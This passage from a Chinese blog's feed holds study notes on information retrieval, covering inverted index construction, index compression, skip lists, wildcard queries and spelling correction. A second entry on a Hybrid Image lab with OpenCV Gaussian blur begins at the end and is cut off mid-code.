    <content type="html"><![CDATA[<h2 id="信息检索第一部分--索引构建">信息检索第一部分--索引构建</h2><h3 id="倒排索引构建">倒排索引构建</h3><p>六个步骤</p><p>序列化，语言预处理，分配DocID，排序，归并，添加频率标签</p><p class="note note-info">为什么要加文本频率？ 便于进行词频的排序，利于后续查询优化</p><h3 id="倒排索引布尔查询">倒排索引布尔查询</h3><p>略。并行课有涉及。比如当求交时可以先将短的链表求交。</p><h3 id="倒排索引优化改进">倒排索引优化改进</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205858253275_753_20221013143627586751_718_image-20220922093753305.png" alt="image-20220922093753305"><figcaption aria-hidden="true">image-20220922093753305</figcaption></figure><p>为了减少字符串所占用的内存，我们可以将键进行序列化。</p><p>Assume we have 1GB of text 800,000 documents 100 million tokens（Reuters-RCV1 collection）</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205859512816_862_20221013143628933413_566_image-20220922094643439.png" alt="image-20220922094643439" width="50%" height="50%"></p><p>（假设是用int存docID）</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205900610358_356_20221013143629914308_735_image-20220922095054178.png" alt="image-20220922095054178" width="50%" height="50%"></p><p>16*1.4</p><p>看上去很好。</p><p>然而，代价是必须要维护一张termID和字符串的映射表。</p><p>当需要处理的数据特别多时，由于排序，归并过程中所有的数据都需要这个表，就不得不一直将它放到内存里。</p><h4 id="bsbiblocked-sort-based-indexing">BSBI（Blocked Sort-BasedIndexing）</h4><p>仍然保留进行映射的策略</p><p>此算法的主要步骤如下：</p><p>1、将文档中的词进行id的映射，这里可以用hash的方法去构造</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205902036538_244_20221013143631068932_652_image-20220922100056227.png" alt="image-20220922100056227" width="50%" height="50%"></p><p>当然，可以先把全部文档读一遍构建映射，再分块构建倒排索引，也可以在构建每一块的倒排索引的时候边构建边映射。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205903463513_670_20221013143632700535_256_image-20220922101046446.png" alt="image-20220922101046446" width="50%" height="50%"></p><p>2、将文档分割成大小相等的部分。分治</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205904763116_686_20221013143634153162_211_image-20220922095854934.png" alt="image-20220922095854934" width="50%" height="50%"></p><p>3、将每部分按照词ID对上文档ID的方式进行排序（保证分块可以在内存里放下）</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205905976403_245_20221013143635299312_759_image-20220922095946828.png" alt="image-20220922095946828" width="50%" height="50%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205907157527_173_20221013143636457198_361_image-20220922100557902.png" alt="image-20220922100557902"><figcaption aria-hidden="true">image-20220922100557902</figcaption></figure><p>4、将每部分排序好后的结果进行合并，最后写出到磁盘中。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205908490376_671_20221013143637743125_385_image-20220922095721101.png" alt="image-20220922095721101" width="50%" height="50%"></p><p>归并的过程中也可以分治，比如内存中只能放100个词条的总倒排索引，可以在第100个的时候写出磁盘（因为已经确定是最后结果了），从101个再继续。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205909676971_525_20221013143639158715_536_image-20220922102146120.png" alt="image-20220922102146120" width="50%" height="50%"></p><h4 id="spimisingle-pass-in-memory-indexing">SPIMI（Single-PassIn-Memory Indexing）</h4><p>不作映射，其他与BSBI一样</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205910771188_815_20221013143640277003_250_image-20220922101959755.png" alt="image-20220922101959755" width="50%" height="50%"></p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205911947753_460_20221013143641398914_475_image-20220922102104189.png" alt="image-20220922102104189" width="50%" height="50%"></p><p>因为D显然要比T小的多</p><h4 id="分布式解决方案mapreduce">分布式解决方案MapReduce</h4><p>大数据实训有涉及，略。</p><h3 id="在线索引构建">在线索引构建</h3><h4 id="朴素方案">朴素方案</h4><h5 id="朴素方案一重建索引">朴素方案一：重建索引</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205913207853_240_20221013143642866848_892_image-20220928141323699.png" alt="image-20220928141323699"><figcaption aria-hidden="true">image-20220928141323699</figcaption></figure><h5 id="朴素方案二辅助索引">朴素方案二：辅助索引</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205915431629_883_20221013143644019596_168_image-20220928141427687.png" alt="image-20220928141427687"><figcaption aria-hidden="true">image-20220928141427687</figcaption></figure><p>使用辅助索引的话，一个很简便的思路是一个词建一个文档，归并便变为两个文档的合并。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205916785627_424_20221013143645445454_230_image-20220928141820357.png" alt="image-20220928141820357"><figcaption aria-hidden="true">image-20220928141820357</figcaption></figure><p>有什么缺陷？文件大小可能差距很大，且大量小文件不便于存储和对索引的快速读写（存储系统的问题）</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205917919255_546_20221013143646682137_270_image-20220928142759774.png" alt="image-20220928142759774"><figcaption aria-hidden="true">image-20220928142759774</figcaption></figure><p>更大的问题，随着文档的数量变大，归并会越来越慢！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205920273505_343_20221013143647947499_639_image-20220928142854979.png" alt="image-20220928142854979"><figcaption aria-hidden="true">image-20220928142854979</figcaption></figure><p>合并时termID是有序的，归并时类似于归并排序，最坏复杂度是较大的那个索引的termID个数。而单个倒排索引合并只需要把新的list放到旧的后面就可以了，因为新的list中的docID肯定会比旧的大（就像上面图上所示）<span class="math display">\[O\left(n+2n+\ldots+\frac{T}{n}\right)=O\left(\frac{T^2}{n}\right)\]</span></p><h4 id="文档删除怎么操作">文档删除怎么操作？</h4><p>无效向量</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205921700479_104_20221013143649321808_563_image-20220928142307585.png" alt="image-20220928142307585"><figcaption aria-hidden="true">image-20220928142307585</figcaption></figure><h3 id="倒排索引压缩">倒排索引压缩</h3><h4 id="一些朴素的偷懒方法">一些朴素的偷懒方法</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205922962959_958_20221013143650616612_634_image-20220928155207922.png" alt="image-20220928155207922"><figcaption aria-hidden="true">image-20220928155207922</figcaption></figure><p>但是现代检索系统一般不会这么做，因为会导致一些信息的丢失。</p><h4 id="词典压缩">词典压缩</h4><h5 id="方法一使用数组">方法一：使用数组</h5><p>是一种很蠢的方法</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205924880094_389_20221013143654714754_145_image-20220928152210011.png" alt="image-20220928152210011" width="50%" height="50%"></p><h5 id="方法二指针">方法二：指针</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205926029760_841_20221013143655839716_271_image-20220928151740804.png" alt="image-20220928151740804"><figcaption aria-hidden="true">image-20220928151740804</figcaption></figure><h5 id="方法二的优化分段指针">方法二的优化：分段指针</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205927711537_423_20221013143657755792_576_image-20220928152418457.png" alt="image-20220928152418457"><figcaption aria-hidden="true">image-20220928152418457</figcaption></figure><p>当然，找termID对应的词项会慢一些。</p><h5 id="采用前缀的方式">采用前缀的方式</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205929015383_614_20221013143659531464_413_image-20220928153011321.png" alt="image-20220928153011321"><figcaption aria-hidden="true">image-20220928153011321</figcaption></figure><h4 id="索引表压缩">索引表压缩</h4><h5 id="encoding-gaps">Encoding gaps</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205930212514_131_20221013143700905497_456_image-20220928153421273.png" alt="image-20220928153421273"><figcaption aria-hidden="true">image-20220928153421273</figcaption></figure><h5 id="variable-length-codings">Variable length codings</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205931738018_759_20221013143702089613_543_image-20220928153533933.png" alt="image-20220928153533933"><figcaption aria-hidden="true">image-20220928153533933</figcaption></figure><p>例子：可变长UTF-8</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205934903217_281_20221013143703419174_526_image-20220928153849498.png" alt="image-20220928153849498"><figcaption aria-hidden="true">image-20220928153849498</figcaption></figure><p>UTF-8 的编码规则很简单，只有二条：</p><p>1）对于单字节的符号，字节的第一位设为<code>0</code>，后面7位为这个符号的Unicode 码。因此对于英语字母，UTF-8 编码和 ASCII 码是相同的。</p><p>2）对于<code>n</code>字节的符号（<code>n &gt; 1</code>），第一个字节的前<code>n</code>位都设为<code>1</code>，第<code>n + 1</code>位设为<code>0</code>，后面字节的前两位一律设为<code>10</code>。剩下的没有提及的二进制位，全部为这个符号的Unicode 码。</p><p>下表总结了编码规则，字母<code>x</code>表示可用编码的位。</p><p></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uffxaulluwpkzu"></i><span>asciidoc</span><div class="collapse show" id="collapse-uffxaulluwpkzu"><pre><code class="hljs asciidoc">Unicode符号范围     |        UTF-8编码方式<span class="hljs-section">(十六进制)        |              （二进制）</span><span class="hljs-section">-------------------+---------------------------------------------</span>0000 0000-0000 007F | 0xxxxxxx0000 0080-0000 07FF | 110xxxxx 10xxxxxx0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</code></pre></div></div><p></p><p>根据上表，解读 UTF-8编码非常简单。如果一个字节的第一位是<code>0</code>，则这个字节单独就是一个字符；如果第一位是<code>1</code>，则连续有多少个<code>1</code>，就表示当前字符占用多少个字节。</p><p>下面，以汉字<code>严</code>为例，演示如何实现 UTF-8 编码。</p><p><code>严</code>的 Unicode是<code>4E25</code>（<code>100111000100101</code>），根据上表，可以发现<code>4E25</code>处在第三行的范围内（<code>0000 0800 - 0000 FFFF</code>），因此<code>严</code>的UTF-8编码需要三个字节，即格式是<code>1110xxxx 10xxxxxx 10xxxxxx</code>。然后，从<code>严</code>的最后一个二进制位开始，依次从后向前填入格式中的<code>x</code>，多出的位补<code>0</code>。这样就得到了，<code>严</code>的UTF-8编码是<code>11100100 10111000 10100101</code>，转换成十六进制就是<code>E4B8A5</code>。</p><h5 id="gamma-encoding">Gamma Encoding</h5><p>根据<a href="https://en.wikipedia.org/wiki/Elias_gamma_coding">维基百科</a>所述，gamma编码过程如下图所示。虽具体过程与课上讲述稍有不同，但原理是一样的。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205936111502_610_20221013143704774266_595_image-20220930155723916.png" alt="image-20220930155723916"><figcaption aria-hidden="true">image-20220930155723916</figcaption></figure><p>编码具体案例和解码过程。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205937375262_217_20221013143706251591_500_image-20220930155802505.png" alt="image-20220930155802505"><figcaption aria-hidden="true">image-20220930155802505</figcaption></figure><h3 id="查询优化">查询优化</h3><h4 id="倒排索引数据结构优化">倒排索引数据结构优化</h4><h5 id="跳表">“跳表”</h5><p>动机</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205939925179_393_20221013143708733468_476_image-20221005150319520.png" alt="image-20221005150319520"><figcaption aria-hidden="true">image-20221005150319520</figcaption></figure><p>怎么选取间隔？“摔瓶子”。开根号</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205941010984_115_20221013143710120784_928_image-20221005150404678.png" alt="image-20221005150404678"><figcaption aria-hidden="true">image-20221005150404678</figcaption></figure><p>实例：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205942199865_675_20221013143711476304_852_image-20221005150523460.png" alt="image-20221005150523460"><figcaption aria-hidden="true">image-20221005150523460</figcaption></figure><p class="note note-info">为什么是先跳再判断，如果跳过了再倒回去，而不是比较之后再跳？后者比较次数太多，开销大，且慢。</p><h4 id="词项数据结构">词项数据结构</h4><h5 id="哈希表">哈希表</h5><p>优点：快</p><p>缺点：不支持模糊查询</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205944152423_245_20221013143713258991_492_image-20221005152131580.png" alt="image-20221005152131580"><figcaption aria-hidden="true">image-20221005152131580</figcaption></figure><h5 id="b树">B树</h5><p>实际使用</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205946525988_190_20221013143716445073_262_image-20221005152231798.png" alt="image-20221005152231798"><figcaption aria-hidden="true">image-20221005152231798</figcaption></figure><h4 id="通配符查询支持">通配符查询支持</h4><p>前缀：B树天然支持</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205948024690_287_20221013143718721740_938_image-20221005153943805.png" alt="image-20221005153943805"><figcaption aria-hidden="true">image-20221005153943805</figcaption></figure><p>后缀：对逆序建B树</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205949456832_729_20221013143720264162_261_image-20221005154022485.png" alt="image-20221005154022485"><figcaption aria-hidden="true">image-20221005154022485</figcaption></figure><p>中间的？好像有点问题。。。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205950707639_732_20221013143721509249_850_image-20221012140726185.png" alt="image-20221012140726185" width="50%" height="50%"></p><h4 id="轮排索引">轮排索引</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205951813968_784_20221013143722646249_170_image-20221012141847402.png" alt="image-20221012141847402"><figcaption aria-hidden="true">image-20221012141847402</figcaption></figure><p>采用B树。但通常这种方法产生的B树会非常大</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205953060880_952_20221013143723834048_694_image-20221012143335531.png" alt="image-20221012143335531"><figcaption aria-hidden="true">image-20221012143335531</figcaption></figure><h4 id="k-gram">K-gram</h4><p>一定程度上的优化</p><p>在一定长度的字串上建索引</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205954611963_730_20221013143725269033_823_image-20221012143730369.png" alt="image-20221012143730369"><figcaption aria-hidden="true">image-20221012143730369</figcaption></figure><p>查$co,ter,er$,$代表起始和结束符号</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205955905050_710_20221013143726834159_151_image-20221012144353569.png" alt="image-20221012144353569"><figcaption aria-hidden="true">image-20221012144353569</figcaption></figure><h3 id="拼写检查支持">拼写检查支持</h3><h4 id="动态规划编辑距离">动态规划：编辑距离</h4><p>动态规划求字符串距离？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205957265992_890_20221013143728315657_544_image-20221012150059012.png" alt="image-20221012150059012"><figcaption aria-hidden="true">image-20221012150059012</figcaption></figure><p>词项太多，算法显得有些复杂，慢</p><h4 id="在k-gram基础上进行">在K-gram基础上进行</h4><p>Jaccard distance判断相似度</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2_%E7%B4%A2%E5%BC%95%E6%9E%84%E5%BB%BA%E3%80%81%E5%8E%8B%E7%BC%A9%E5%8F%8A%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81/20230828205958320184_528_20221013143729475948_696_image-20221012151057155.png" alt="image-20221012151057155"><figcaption aria-hidden="true">image-20221012151057155</figcaption></figure><p>求并集的小trick</p><p>#query term's k-grams +#found term's k-grams-#intersection</p><h4 id="上下文相关检查">上下文相关检查</h4><p>利用搜索历史，启发式</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息检索</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hybrid Image</title>
    <link href="/posts/37973/"/>
    <url>/posts/37973/</url>
    
    <content type="html"><![CDATA[<h1 id="hybrid-image">Hybrid Image</h1><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Hybrid%20Image/20230828210854731226_846_20230329203430934130_398_image-20230329203201849.png" alt="image-20230329203201849"><figcaption aria-hidden="true">image-20230329203201849</figcaption></figure><p>•A. Oliva, A. Torralba, P.G. Schyns, <a href="http://cvcl.mit.edu/hybridimage.htm">“Hybrid Images,”</a> SIGGRAPH2006</p><h3 id="实验目的">实验目的</h3><p>了解图像处理的基础，熟悉高斯滤波操作。</p><h3 id="实验原理">实验原理</h3><p>根据论文，混合图像是通过在两个不同的空间尺度上叠加两个图像来生成的：低空间尺度是通过低通滤波器对一个图像进行滤波来获得的；通过用高通滤波器对第二图像进行滤波来获得高空间尺度。通过将这两个滤波后的图像相加来合成最终图像。</p><h3 id="实验过程">实验过程</h3><h4 id="直接高斯滤波">直接高斯滤波</h4><p>最简单的，我们可以调用OpenCV的<code>GaussianBlur</code>对图像进行高斯滤波，得到低频图像，然后用原图像和减去低频图像就可以得到高频图像。</p><p><code>GaussianBlur</code>函数对操作进行了封装。如</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wfu90ulluxp18z"></i><span>C++</span><div class="collapse show" id="collapse-wfu90ulluxp18z"><pre><code class="hljs C++"><span class="hljs-built_in">GaussianBlur</span>(low_img, blurred_low, <span class="hljs-built_in">Size</span>(<span class="hljs-number">25</span>, <span class="hljs-number">25</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</code></pre></div></div><p>生成的高斯滤波器<code>kernel size</code>为25×25，后两个参数为0表示让OpenCV自动根据滤波器大小选择高斯函数中的<span class="math inline">\(\sigma\)</span>参数。最后面省略了一个参数表示<code>padding</code>的方式，默认为<code>BORDER_DEFAULT</code>，及不含边界值倒序填充。</p><p>完整代码如下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-j9bfrylluxp18z"></i><span>C++</span><div 